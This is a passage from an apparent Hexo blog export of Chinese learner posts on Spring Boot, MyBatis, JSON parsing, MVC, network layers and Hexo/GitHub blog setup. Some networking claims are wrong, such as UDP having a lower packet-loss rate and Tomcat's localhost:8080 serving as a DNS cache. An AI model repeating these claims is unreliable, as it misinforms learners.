bean.setFilter(new WebStatFilter()); //不去拦截的文件 initParams.put("exclusions", "*.js,*.css,/druid/*") ; bean.setInitParameters(initParams); bean.setUrlPatterns(Arrays.asList("/*")); return bean ; &#125; 书写Mapper映射1.首先我们需要创建一个model这里我们是单词，所以创建eword 类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class eword &#123; private String English ; private String Quality ; private String Meaning ; private String Level ; private String U_phon ; public String getEnglish() &#123; return English; &#125; public void setEnglish(String english) &#123; English = english; &#125; public String getQuality() &#123; return Quality; &#125; public void setQuality(String quality) &#123; Quality = quality; &#125; public String getMeaning() &#123; return Meaning; &#125; public void setMeaning(String meaning) &#123; Meaning = meaning; &#125; public String getLevel() &#123; return Level; &#125; public void setLevel(String level) &#123; Level = level; &#125; public String getU_phon() &#123; return U_phon; &#125; public void setU_phon(String u_phon) &#123; U_phon = u_phon; &#125;&#125; 创建mapper注意mapper 的实现是需要interface接口的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Result;import org.apache.ibatis.annotations.Results;import org.apache.ibatis.annotations.Select;@Mapperpublic interface level4Word &#123; @Results(&#123; @Result(column="aw_english",property="English"), @Result(column="aw_meaning1",property="Meaning"), @Result(column = "aw_vocQuality",property = "Quality"), @Result(column = "aw_level1",property = "Level"), @Result(column = "aw_UKphonogram",property = "U_phon") &#125;) @Select("select * from allword") public eword[] getWordByID() ;&#125;``` #### 常用的注解@Insert --- 插入@Delete --- 删除@Update --- 更新@Select --- 查找@Param --- 入参@Results --- 字段统一 ： 这个部分其实和&lt;resultmap&gt;一样，就是为了解决字段名和实体类参数名不一样选用的 使用方法如上就是@Results（@Result（），····）### 学习网页链接https://blog.csdn.net/zlh313_01/article/details/80031583### Mybaties深入实战1. 对于mybaties框架，自动映射的机制无疑是备受追捧的，但是自动映射的背后有下有诸多的问题也让人措手不及，经过商城项目的具体实战，对于mybaties的思考有了更深一步的思考。2. 由于前后分离的大趋势之下，前端请求数据全靠跨域来解决，那么后端所可以获取的数据目前主流来看，最常用的就是json数据，但是json数据转为javaBean又是一门深入的学问，同时，爬虫爬去数据也令人头疼，由于多表数据混合，也让人头大。3. string =&gt; jsonString ， jsonString =&gt; javaBean ， javaBean =&gt; mybaties映射#### 获取跨域数据 RestTemplate同单体开发不同，跨域之后json数据都在ip地址的网页中，首要目的就是获取 网页上的json数据##### 配置 pom.xml``` xml &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; 配置Configuration12345678910111213141516package com.scs.web.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;import org.springframework.web.client.RestTemplate;@Configurationpublic class TempleteConfig &#123; @Bean public RestTemplate httpClientRestTemplete()&#123; RestTemplate restTemplate = new RestTemplate(new HttpComponentsClientHttpRequestFactory()); return restTemplate ; &#125;&#125; 获取跨域ip的json数据只有一句代码简单吧12HashMap&lt;String,String&gt; json = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); JSON数据处理-FastJson 第三方json处理工具数不胜数，有阿里的fastjson，还有gson据说也很好，看个人需求了 json数据有两种 普通 json 和 Array，务必注意这两种，对json数据一定要分析清楚再建立实体类 跨域ip获取的String尽管看上去很像我们的所需要的json格式，但是fastjson处理的时候，不可以这么处理，一定要进行转化 fastjson 对于 JSON 和 JSONArray 是完全不同的处理方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384@RestControllerpublic class InitDataController &#123; /* @Autowired private RestTemplate restTemplate ; //List&lt;HCinema&gt; hCinemas ; @GetMapping("/initData") public Object InitData()&#123; List&lt;HCinema&gt; Infos ; String jsonStr = restTemplate.getForObject("http://106.15.179.119:3007/", String.class); String json = JSONArray.toJSONString(jsonStr) ; Infos = JSONArray.parseArray(json, HCinema.class); return Infos; &#125;*/ @Autowired private RestTemplate restTemplate ; @Autowired private CinemaInfo cinemaInfo ; //List&lt;HCinema&gt; hCinemas ; /*@GetMapping("/initData") public List&lt;HCinema&gt; InitData()&#123; List&lt;HCinema&gt; infos = new ArrayList&lt;&gt;(); HashMap&lt;String,Object&gt; resourceMap = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); resourceMap.forEach((key,v)-&gt;&#123; List&lt;BasicInfo&gt; baseInfo = JSONArray.parseArray(JSONArray.toJSONString(v), BasicInfo.class); HCinema temp = new HCinema(key, baseInfo) ; infos.add(temp); cinemaInfo.InitSCSData(temp) ; &#125;); return infos; &#125;*/ @GetMapping("/initData") public Object InitData()&#123; // 获取跨域数据 HashMap&lt;String,String&gt; json = restTemplate.getForObject("http://106.15.179.119:3007/",HashMap.class); for (String key:json.keySet()) &#123; //转由JSONArray转List HCinema temp = new HCinema(key, JSONArray.parseArray(JSONArray.toJSONString(json.get(key)), BasicInfo.class)); List&lt;BasicInfo&gt; baseTemp = temp.getMov(); for (BasicInfo basicInfo: baseTemp) &#123; List&lt;MovieFeature&gt; movTemp = basicInfo.getFeas() ; for (MovieFeature moInfo: movTemp) &#123; // mapper入表 moInfo.setBaseno(basicInfo.getNo()); cinemaInfo.InsertMovieFeature(moInfo); &#125; HashMap&lt;String,SaleVol&gt; salInfo = JSON.parseObject(JSON.toJSONString(basicInfo), HashMap.class); // mapper入表 basicInfo.setFieldName(key); cinemaInfo.InsertBasicInfo(basicInfo); // mapper入表 SaleVol saleInfo = JSON.parseObject(JSON.toJSONString(salInfo.get("feas_num")),SaleVol.class); saleInfo.setBaseno(basicInfo.getNo()); // mapper入表 cinemaInfo.InsertSaleVol(saleInfo); &#125; &#125; return "Success"; &#125;&#125; 代码分析12345678910111213141516171819202122232425262728293031323334353637383940414243&#123; "星烨": [ &#123; "begin_date": "2019-02-03", "casts": "古天乐;郑嘉颖;林峯;林家栋;", "copy_time": "98", "countries": "香港;中国大陆;", "directors": "林德禄 ;", "feas": [ &#123; "date": "2019-04-14", "end_time": "11:58", "film_lang": "国语", "film_name": "反贪风暴4", "film_no": "001100042019", "hall_name": "六号RGB三色激光厅", "is_3d": "0", "is_special": "0", "is_visable": "1", "no": "0000037045", "pFav": "9.90", "pStan": "50.00", "time": "10:20" &#125;, &#123; "date": "2019-04-14", "end_time": "14:48", "film_lang": "国语", "film_name": "反贪风暴4", "film_no": "001100042019", "hall_name": "二号厅(3D眼镜自备或5元起购)", "is_3d": "0", "is_special": "0", "is_visable": "1", "no": "0000037022", "pFav": "9.90", "pStan": "50.00", "time": "13:10" &#125; &#125; ]&#125; 非标准json，比如 “星烨” ,就只能用 java容器 map进行接受，否则后面的属性都会读取错误，且这是起始的问题，如果是后面的出现类似着这样的情况，果断建新表进行处理，对于实体类中含有容器，直接遍历解决，否则会出现诸多问题。 servlet配置12345678910111213141516171819202122232425package Service;import org.springframework.context.annotation.Bean;import org.springframework.http.HttpMethod;import org.springframework.http.ResponseEntity;import org.springframework.stereotype.Service;import org.springframework.util.MultiValueMap;import org.springframework.web.client.RestTemplate;@Servicepublic class HttpClient &#123; public String client(String url, HttpMethod method , MultiValueMap&lt;String,String&gt; params)&#123; RestTemplate template = new RestTemplate(); ResponseEntity&lt;String&gt; responseEntity = template.getForEntity(url, String.class); return responseEntity.getBody() ; &#125;&#125; 开启驼峰命名规则1234567891011121314@Configurationpublic class MybatiesConfig &#123; @Bean public ConfigurationCustomizer configurationCustomizer()&#123; return new ConfigurationCustomizer() &#123; @Override public void customize(org.apache.ibatis.session.Configuration configuration) &#123; configuration.setMapUnderscoreToCamelCase(true);//设置驼峰命名规则 &#125; &#125;; &#125;&#125; 处理fastjson中文乱码问题123456789101112131415161718192021222324252627282930313233package com.scs.web.config;import com.alibaba.fastjson.serializer.SerializerFeature;import com.alibaba.fastjson.support.config.FastJsonConfig;import com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter;import org.springframework.context.annotation.Configuration;import org.springframework.http.MediaType;import org.springframework.http.converter.HttpMessageConverter;import org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;import java.util.ArrayList;import java.util.List;@Configurationpublic class MyFastJsonConfig extends WebMvcConfigurationSupport &#123; @Override public void configureMessageConverters(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)&#123; //创建fastJson消息转换器 FastJsonHttpMessageConverter fastJsonHttpMessageConverter = new FastJsonHttpMessageConverter(); //创建配置类 FastJsonConfig fastJsonConfig = new FastJsonConfig(); fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat); //处理中文乱码问题 List&lt;MediaType&gt; fastMediaTypes = new ArrayList&lt;&gt;(); fastMediaTypes.add(MediaType.APPLICATION_JSON_UTF8); fastJsonHttpMessageConverter.setSupportedMediaTypes(fastMediaTypes); fastJsonHttpMessageConverter.setFastJsonConfig(fastJsonConfig); converters.add(fastJsonHttpMessageConverter); &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot Redis缓存服务]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-08-redis%E7%BC%93%E5%AD%98%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Springboot中的缓存机制讲解 web的大型工程的开发中，请求不可能每一次直接穿透到数据区进行数据访问，由于占用的系统资源过大，会导致系统资源负载过大而出现一系列问题 常见的缓存服务nosql , redis , MC ,mongodb , hive …]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F03%2F23%2FFiveLayerNetworkProtoco%2F</url>
    <content type="text"><![CDATA[Five layer network protoco 五层网络协议 三种模型 （包含五层网络协议）OSI七层体系结构 应用层 ： 报文表示层 ： 确保一个系统的应用层所发送的信息可以被另一个系统的应用层读取会话层 ： 从网络到具体的本地设备之间联系运输层 ： 数据协议等基本信息网络层 ： 网络系统中主机之间的数据的传输和路径的选择数据链路层 ： 规范数据的传输到物理设备物理层 ： 最底层，就是我们所见到的网络接口光纤等 TCP/IP四层体系结构 应用层运输层网际层网络接口层 五层网络结构 应用层 ： 顾名思义，向用户提供最直接的网络服务，如HTTP，SMTP， FTP等运输层 ： TCP，UDP两种协议传输数据网络层 ： 1.）把运输层中的报文段封装成包进行传输 2.）选测路由，通过路由找到合适的主机数据链路层 ： 规范数据传输到物理设备物理层 ： 最底层，网络接口光纤等 三种模型的联系和关系这里提及一点所谓的五层网络协议其实并不是特别准确的描述，只是OSI和TCP/IP体系结构的综合表述 具体关系如下 ： TCP 和 UDP 补充如上介绍，TCP和UDP是存在于运输层的两种传输协议，而报文段的传送也主要是以来于这两种协议，那么二者的区别呢 (1) 传输控制协议TCP(Transmission Control Protocol)：面向连接的，数据传输的单位是报文段，能够提供可靠的交付。(2) 用户数据包协议UDP(User Datagram Protocol)：无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。 二者的比较 由于TCP一定需要连接，所以TCP与UDP相比也更加的安全TCP的连接保证安全的代价也是更大的，也导致了TCP的传输效率低的问题，相比起来的话，UDP则具备速度快，连接简单，消耗资源低的优点UDP的丢包率更低总而言之TCP与UDP的根本却别在于是否需要连接]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboor2.0新特性记录]]></title>
    <url>%2F2019%2F03%2F23%2Fspringboot%E6%96%B0%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[EmbeddedServletContainerCustomizer EmbeddedServletContainerCustomizer =&gt; WebServerFactoryCustomizer ;]]></content>
  </entry>
  <entry>
    <title><![CDATA[MVC续谈]]></title>
    <url>%2F2019%2F03%2F23%2FMVC%2F</url>
    <content type="text"><![CDATA[mvc，mvp，mvvm理解 mvc作为经典的开发模式，能经久不衰当然是有独到的过人之处的，简单容易理解model，controller，view三大部分，相互独立，但是也相互关联使得开发变得条理性极强，同时由于独立性使得可维护性很高简单的说一下网页的布局，view就是前端的那些东西，html，css顺一个js，model和数据库以及所需要的对象模型 mvc，mvp，mvvm理解 mvc作为经典的开发模式，能经久不衰当然是有独到的过人之处的，简单容易理解model，controller，view三大部分，相互独立，但是也相互关联，使得开发变得条理性极强，同时由于独立性使得可维护性很高，简单的说一下网页的布局，view就是前端的那些东西，html，css顺一个js，model和数据库以及所需要的对象模型，在然后就是servlet作为controller了，交互有两种方式，v-&gt;c-&gt;m，v-&gt;m-&gt;c，这样子完成对数据的处理，也就是所谓的后端流程，在javaee中的建包方法就很好的体现了这点，分别是，dao包，service包，和servlet包（实际上还有一个dbutil是用来折腾jdbc的，不赘述了）dao就是model，service和servlet就是controller了，service是服务层，就是一个调用接口的过程，servlet就是真正的controller了，其实这些包下面还有impl子包，这样子的话实现与声明分离，可维护行也提高。再继续举例子，就是Python的flask框架了，他的分离更加简单，static静态资源库，home//admin，前台和后台的分离，init初始化，run开始。也是完全走着mvc的风格。总而言之mvc就是让模块分离的一种设计思想 ##mvvm和mvp,这两个直接看图吧。没啥好讲的了。。 说一下缺点，看了一下那篇英文的和那个中文的mvc已死的博客，其实双方都是担忧一个controller臃肿的问题，没错，如果太多的处理量都传递给controller那么势必变得繁杂，更可怕是提高耦合度，所以他们想利用一个content模块来分担controllet的压力，更多的数据处理放在content，更多的逻辑处理放在controller，尽管没有成型，但是博主们都给出了类似这样子的思路。不过话讲回来，mvc始终是经典，现在仍然是主流，学习的时候用mvc的思路去分析，还是十分必要的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[从url到网页到底发生了什么]]></title>
    <url>%2F2019%2F03%2F23%2FFromUrlToPage%2F</url>
    <content type="text"><![CDATA[url是什么 URL其实就是我们常说的网址，作用也是顾名思义就是定位效果，而术语则是资源定位符，也是互联网上标准资源的地址，这个点到为止不再赘述。 DNS解析什么是DNS解析 然后下一步我们需要dns解析，什么dns解析呢，就是把url翻译成机器可识别的数字格式，类似我们所熟悉的192.168.1这样子，这样子才是可以被解析的。 DNS解析过程 这个过程也是在专门的解析服务器上自动解析的，dns解析会有四个步骤， 第一个则是查找浏览器缓存（不同浏览器不同一般是两到三十分钟左右）第二个则是在本地系统查找缓存（本地也会有缓存，比如tomcat的localhost：8080）第三个是在路由器查找缓存（没错，部分路由器是具有缓存功能的）第四个则是ISP查找（这个比较厉害，直接查向运营商最高服务器）。之后就是通过tcp链接服务器了，服务器这时才会开始处理请求，向我们的浏览器传递数据，一些需要注意的地方 值得注意的是浏览器是边传输边渲染的，当然没有遇到js之前，js是单线程，而且js可以对html网页进行更改，大家所看到的很好的特效，都是js在进行这时我们的页面就加载完成啦。至于通信协议也是很简单，就是传递给服务器的协议，当然服务器向浏览器传输也要遵循http你要通过才能传递，这是一种规范也是一种手段。还有就是渲染过程也是可以了解一下的，渲染以树的方法渲染着呢，dom树，解析css和js交互。再细化就是前台和后端了，后端可以直接用servlet来传递协议（虽然springmvc里面是dispatcherservlet，或者说是controller，但是实质还是servlet，接口几乎全适用）但是这样子传输还是存在问题，这样前后端交互总这样，数据更新不同步，所以ajax就出现了，实现机理也简单,就是在传递给servlet之前，需要多传递一个ajax。如此就可以不必要必须走服务器，走异步交互啦，技术方面就是jquery。]]></content>
  </entry>
  <entry>
    <title><![CDATA[单例设计模式，MVC，监听者模式]]></title>
    <url>%2F2019%2F03%2F23%2Fdesignpattern%2F</url>
    <content type="text"><![CDATA[目前的了解三种设计模式单例设计模式单例模式其实显而易见，就是突出一个单字，一切运行过程核心集中于一个类，采用该模式开发，也是要求一个类只有一个对象，或者说只有一个实例。 监听者模式，怎么讲呢？监听者模式其实更像是按照树的思路创建出的一种设计模式，简单的说起来就是子类被父类监听，逐级向上传递，期中需要三个对象，事件，事件源，事件监听器。相对应的还有一个观察者模式，emm，个人理解哈，讲真，观察者模式就是监听者模式简化。 大名鼎鼎的MVC 大名鼎鼎的开发模式了，spring为了web还专门引出分支springmvc，可见一斑了，m是model，v是view，c是controller。用springmvc作为典例说一下哈，m就是模型对象，是一种概念吧，传参，用的mode，modeandview应该都不陌生，还有就是bean的配置都是model的东西，在这里可以理解成封装好的project的应用模型，view，就是给用户看到的东西呗，js，html，css这些前端的东西嘛。controller，这个是核心了，也就是真正的后端完善逻辑部分的核心控制器了，springmvc中直接明确给controller极高的地位置，dispatchercontroller，这个可不虚名，model传来的的参数，view的视图，在中央核心控制器中都可以实现，所以听名字就可以看出来重要性了，最后总结一下，其实mvc就是把图和逻辑分开，逻辑把参数和真实逻辑又分开的一种开发模式，这样导致程序的可维护性增加，逻辑出错找逻辑，参数出错找model，视图修改找view]]></content>
  </entry>
  <entry>
    <title><![CDATA[hexo + github 博客搭建教程]]></title>
    <url>%2F2019%2F03%2F23%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[搭建博客的一些基本常识我们搭建博客还是需要一点基本的知识的，不会让大家盲目的只是照着教程去看这些东西，更多的希望 大家可以从中明白一些网站什么的基本原理 1.） github一个网站能否被外网所访问，最关键的是需要一个平台或者说是一个服务器去使用，所以一部分 会直接自己写博客放在自己的服务器上（小声：本文不是这样的），但是服务器是需要买的，成本太大 我们不使用这种方法，但是github也可以当作一个服务器来看待，我们就可以托管到github上使得我们 的博客可以访问。 2.） git博客的搭建，不仅仅是一个被访问的过程，你还需要用自己的电脑去不断的操作你线上的博客，那么 git这个工具就是一个必不可少的东西了，这个可以直接与你的github操作，完成你博客的更新。但是本地 和线上博客交互，你起码要让github知道，你的本地是安全的，可以被访问才行，所以ssh密匙就是做这个 工作的，只有ssh密匙认证，这个样子我们的才能放心我们博客的安全 3.） 关于主题博客嘛，毕竟是自己的，我们所需要的当然不仅仅是被访问，关键是得自己喜欢，所以有了主题选择 的这个部分 1. github部分github注册 （如果已经有账号的可以忽略一下）github 首先进入官网，记得去注册一个github账号，没有注册过的第一个页面就是github的注册页面 2. 创建一个仓库 注册完毕以后就是去new 一个repository 一定要按照我的要求去写，尤其是那个用户名，比如我的用户名是Runindark，所以是Runindark.github.in 你们需要的就是用你们自己的用户名替换我的Runindark就好了 这个也选好把，没什么坏处 之后就可以看到大致这样的界面了，我的是已经搭建好的所以和大家刚刚弄好的不太一样，但是大致界面没问题 3. 下载gitgithub 下载好以后，安装，全程默认设置一直点就OK了这个超级简单。 4. 下载node.jsnode.js 大家需要下载这个，毕竟有很多东西都是这里的，老老实实安装吧 5. 下载hexo然后大家需要在自己的电脑上找一个地方去创建一个文件夹，用来存放你自己博客的内容的地方，而且博客的初始化文件也很重要 创建好以后右击文件夹 git bash 就会进入了，名字不重要，大家自己随便起就欧克了 开始执行命令了，后面的环节大家划重点，不要关闭你的gitbash的终端窗口，一定不要 /********安装hexo指令********/ npm install -g hexo-cli /*******hexo初始化指令*******/ hexo init /*******hexo安装组件*********/ npm install /******静态网页更新指令*******/ hexo g /******静态网页启动服务*******/ hexo s 这样子一套下来，应该会出现 浏览器输入网址： http://localhost:4000/ 大家应该会出现 hexo 的那个基本的页面，如果没有出现网页，那么就需要自己考虑一下是不是哪一步有问题了 如果正常的话，这个样子你的博客就完成一大半了，先恭喜一下。 6. ssh密匙这部分的作用我在开头已经给大家讲过了，大家严格按照我的步骤，做下去就没问题使得github和你的hexo联系起来 git config --global user.name &quot;Runindark&quot; git config --global user.email &quot;1414776384@qq.com&quot; //提示一下，Runindark是要替换成你的github名字的 //提示两下，1414776384@qq.com 是需要替换成你注册github时的邮箱的 ssh-keygen -t rsa -C “1414776384@qq.com” //这边也是，邮箱要换成你注册github的邮箱 eval &quot;$(ssh-agent -s)&quot; ssh-add ~/.ssh/id_rsa 输入完这两条指令就欧克了，然后需要找ssh文件了 目录就是你的c盘用户名下面，我的如下 再之后就是用记事本打开我标注的哪个文件，所谓的ssh密匙就是这个了 复制，粘贴全部（ps一下哈，这个东西打开末尾是你的邮箱，如果不是，那就是出错了） 重新打开你的github 打开之后，创建新的ssh 如图，简单操作一下 别急·冷静·还有最后一步马上完事了 下载sublime 超级好的工具sublime 下载好以后，打开，把之前创建的初始化hexo的文件夹都拖进来，如图 找到config配置文件 然后更改如图的内容 说一下哪个repository，这个地方是在github上的，如图，大家要复制那里的东西 最后屏住呼吸 输入如下指令 hexo d -g 然后大功告成 输入 Runindark.github.io.git （Runindark换成你的用户名） 就可以访问外网了。 博客搭建到这里就结束了，后面两部分，下次给大家更新 7. 选择主题8. 域名绑定]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-05-配置文件]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-05-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[springboot中含有大量的配置文件，但是究竟有哪些属性被配置，或者需要配置，作为开发者都应该有个大致的了解 配置文件的几种类型xml 学习spring的第一个配置文件就是xml文件了，在我们的maven工程中pom.xml大家应该都不陌生了语法直接看看百度就好，也没什么要说的，有点类似html，写起来个人觉得繁琐了一些 properties 在我们的springboot中的/config/application.properties就是这个类型的文件，语法特别的简单易懂 yaml 如果利用markdown的小伙伴使用这个的话一定不陌生了，利用space来进行区域的划分，速度快，唯独语法上要求key：必须带有空格个人更新博客的时候有被类似的要求坑害过，但是不能直接给yaml差评 json springboot中默认的文件传输，速度快，短小精悍。 个人总结这些语言其实只是一个工具，每种语言的诞生都是有自己的含义的，只要用的习惯就好，博主比较懒，一般就是application.properties中直接更改了，或者也用用yaml，这个不重要，大家自我定夺 。 springboot中默认的属性官方默认属性查看 如果需要修改，直接复制对应的配置文件，加到application.properties里面]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-04-热部署]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-04-%E7%83%AD%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[对于我们的开发来说，如果每一次更新文件或者源码，都需要去重启服务的话，对我们的开发和执行效率来说实在是太慢了。springboot由于自身整合了tomcat所以速度更快一些，如果是学习过springmvc的话，每次都去重启tomcat服务器是特别慢的，热部署也就应运而生了。 热部署热部署官网 依赖代码 org.springframework.boot spring-boot-devtools true 热部署基本操作 更改源码后直接 ctrl+s 执行保存操作更新 在application.properties中更改一些路径不被热部署 spring.devtools.restart.exclude= (文件路径) 如果你不想每次执行保存操作后就进行热部署，那么可以用 “trigger.txt” 文件修改 在application.properties中添加如下代码spring.devtools.restart.trigger-file=trigger.txt创建 “trigger.txt” 文件这样你只有在保存trigger.txt文件的时候进行热部署 注意事项： 在springboot中热部署你修改的java源码中的内容，但是静态目录的内容是不会被加载的 热部署的实质是监听，他会捕捉 你 ctrl + s的操作，也就是文件保存的操作，将触发热部署 热部署是主动进行的，如果你的保存操作被执行，那么你将会看到日志信息的更新 为什么提早讲述热部署我觉得热部署其实是很简单的一种骚操作，没有什么太高大上的东西，但是具有足够的基础和底层理论的积累，可以看看jvm的classloader的部分（惭愧：目前自己没看过）而且提早进行热部署可以提早的进行熟悉，对后面的整合会更加自如]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F03%2F23%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-03-目录结构再谈]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-03-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%86%8D%E8%B0%88%2F</url>
    <content type="text"><![CDATA[重读目录结构使用一个框架，也同时意味着去遵守一个框架的标准，包括目录的结构，目录名，虽然之前我简单的有提过我们的目录结构，但是只是很粗浅的说，其实目录结构大多数的博主是不会提及的，自己也踩过雷，也当是在这个方面有过很多的纠结，所以觉得有必要重新拿起目录结构深究一下。 目录结构 src/main/java：存放代码src/main/resourcesstatic: 存放静态文件，比如 css、js、image,templates:存放静态页面jsp,html,tplconfig:存放配置文件,application.propertiesresources: 可以看到这就是我们的完整的目录信息，至于至于源码区域我们不用多说，以后会常常用到，所以不是这次说的重点。对于config，我有说过springboot其实封装好了大多数的东西，但是有些默认的参数是我们不需要的，那么调节或者说更改参数就是在config下的文件进行修改，距离写出的application.properties只是系统自动生成的文件之一，今后我们还会使用到yaml和xml，当然yaml会更加的方便我们的书写，也更加的快速 静态资源目录我们可以看到可以存放资源的目录有很多，这些目录的名字都是系统中默认写好的名字，我们不要去做任何的修改，springboot在启动的时候会自动的从我们的文件目录下去寻找自己锁需要的文件，如果随意的更改我们的文件名字，就会导致无法获取我们所需要的静态资源从而导致404这类错误，当然springboot查询目录也是有自己的优先级的，下面就是优先级的排布 META/resources &gt; resources &gt; static &gt; public 有些东西需要注意一下，在springboot中，其实高优先级与低优先级之间不是覆盖的关系，而是互补的，举个例子来说如果你在高优先级更改端口号，那么低优先级再更改端口号是没有意义的但是如果你在低优先级中书写了其他的内容，那么依然生效 默认配置官网地址 spring.resources.static-locations =classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-02-控制器和注解]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-02-%E6%8E%A7%E5%88%B6%E5%99%A8%E5%92%8C%E6%B3%A8%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[说在前面的话对于一个后端来说，其实很简单的，说的明白一些就是接受和处理前端的数据，同时也要发送整理好的数据给前端网页，但是，在springboot，如何进行前后端数据的交互，就是要涉及到springboot了 。 中央核心控制器 DispatcherServlet上面提到的，前后端数据的交互的核心就是我们controller了，在springmvc中，这个东西可是最为关键和核心的内容,如下是dispatcherServlet在springmvc中的注册信息，（这里带大家看一下，毕竟这是springmvc中的东西，在我们的springboot中是看不到的） springMVC org.springframework.web.servlet.DispatcherServlet contextConfigLocation classpath:springmvc.xml 1 说到底，我们的controller的实质还是一个servlet，在javaEE中，我们的使用常用的HTTPServlet，因此HTTPServletRequest，HTTPServletResponse放在controller中是完全适用的。 我们后端的绝大多数操作也将会放在controller中进行，所以务必注意，包括之后的皆接口的名字，导包信息，都要谨慎 。 第一个controller 大家可以先观察一下我们的controller的类是放在什么位置的，然后我加上源码分析一下 。 package com.yuliao.wordsmemory; import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController; //controller注解@RestControllerpublic class Words { //映射注解 @RequestMapping(“/printWords”) public String printWords (){ //输出到前台的数据 return &quot;HelloWorld&quot; ; } } @RestController 其实RestController是两个注解的合体，我们之所以可以在controller使用return语句返回 “HelloWorld” 到前台其实是一个叫@ResponseBody的注解在起作用分析底层底层源码是可以看到的，所以在这里我们可以写一个等式 @RestController = @Controller + @ResponseBody @RequestMapping RequestMapping就是我们所说的映射，这个就是在网页静态地址规范controller作用范围，就如刚刚我们的代码所写的，我们启动服务器以后我们需要在浏览器中查找 数据的传输在我们的springboot中默认的数据传输类型是json格式的，当我们创建一个类的时候，利用 return 返回到前台的时候，会自动变成json的数据类型，javabean自动序列化成json数据类型是有 jackson&gt;fastjson&gt;gson&gt;json-lib ，我们使用的是jackso，所以一些我们的常用的注解有以下集中指定字段不返回： @JsonIgnore指定日期格式： @JsonFormat()指定别名： @JsonProperty 一些要说的东西这里的注解只是很简单的给大家介绍一下如何向前台传递数据，至于如何从前台获取数据稍后也会更新，对于注解这是我们最常用的几个，但是这些数量对于我们来说是远远不够的，包括去掉@ResponseBody传递数据将会有什么用，这些都暂时没有提及。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot-01-项目建立]]></title>
    <url>%2F2019%2F03%2F23%2FSpringBoot-01-%E9%A1%B9%E7%9B%AE%E5%BB%BA%E7%AB%8B%2F</url>
    <content type="text"><![CDATA[说在前面的话一头扎入框架的我也慢慢的开始接触springboot的旷阔领域中，之前学习了太多的理论知识，实践能力着实不堪，立下flag以求自己能坚持下去，同时开始稳定更新博客，从头到尾的去把springboot的教程出一份，作为自己的笔记也作为经验之谈，写的不好的地方大家多多指出，谢谢。 学习springboot你需要什么知识储备 不要轻举妄动，框架的学习要一步一步的走，直接跨越，直接上手springboot，你也许觉得照猫画虎，框架的使用很简单，但是只有表面功夫是远远不够的，沉住气，你需要学习 javaEE , springmvc至于持久层mybatis可以暂时跳过，spring一些属性注入方式也可以暂时不看，但是前两者的一定要看。至于要看的课程的话 推荐一个老师，淘宝买课认识的，大家可以去看下 monkey1024要资源的话不要找我，尊重一个老师的劳动成果，几十的东西，大家买一下，支持一个 ##开发工具(IDE) 我推荐哈，idea很舒服，简单明了，之前有用过pycharm和clion的都可以直接上手的，毕竟一个公司设计的东西，eclipse怎么说呢，很好的ide，但是容易抽风，如果身边有常用eclipse的人，他们口头都会挂上一句“重启大法好”，所以入门直接使用idea就很好了，我的教程也全是基于idea的，下载过程省略，IDEA 项目创建项目的教程全部如图咯~ 目录分析如图我们来看一下我们的初始化目录，该写什么，能写在哪里，之间的调用方式和执行流程都和目录关系密切（只列举我们要用到的，或者说常用的，其他的有些我也其实不清楚，有的直接删除也不影响） src:这个就是我们的源码区域 java: 要写的controller，DAO ， impl等 resource: 顾名思义就是我们的一些资源文件，其下的static就是我们所说的静态资源，包括css,html,js,image等等 templates： 也是顾名思义就是模板，也是我们的一些模板引擎，例如 JSP、Velocity、Freemarker、Thymeleaf我后期会更新的也是thymeleaf，当然也是springboot官方推荐的 test: 